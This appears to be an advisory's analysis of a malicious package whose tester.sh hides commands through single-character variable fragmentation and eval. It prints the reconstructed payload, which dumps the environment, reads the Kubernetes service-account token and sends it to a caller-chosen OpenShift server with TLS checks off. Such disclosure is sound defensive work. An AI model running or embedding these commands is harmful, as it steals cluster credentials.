details: Both published versions ship package/tester.sh, presented as a network/diagnostics helper, that reassembles and executes hidden shell commands at runtime. The script splits each command into 17 single-character variables, concatenates them and passes the result to eval, so the real commands never appear as literal strings in the file. Reconstructed, the payload runs three commands in order: it executes printenv to dump the process environment, it runs export DEBUG_FILE=$(cat /var/run/secrets/kubernetes[.]io/serviceaccount/token) to read the Kubernetes service-account bearer token from its standard in-cluster path, and it then runs./oc login --token=$DEBUG_FILE --server=$SERV --insecure-skip-tls-verify, sending that token to a caller-controllable OpenShift server with TLS certificate verification disabled. The package's documentation describes benign hostname/HTTPS diagnostics, but the shipped JavaScript implements only a DNS/HTTP client that performs no hostname collection, so the fragmentation and eval block is the only credential-handling code in the tarball and has no diagnostic purpose. No C2 host is hardcoded: the exfiltration destination is supplied at run time through the SERV environment variable.
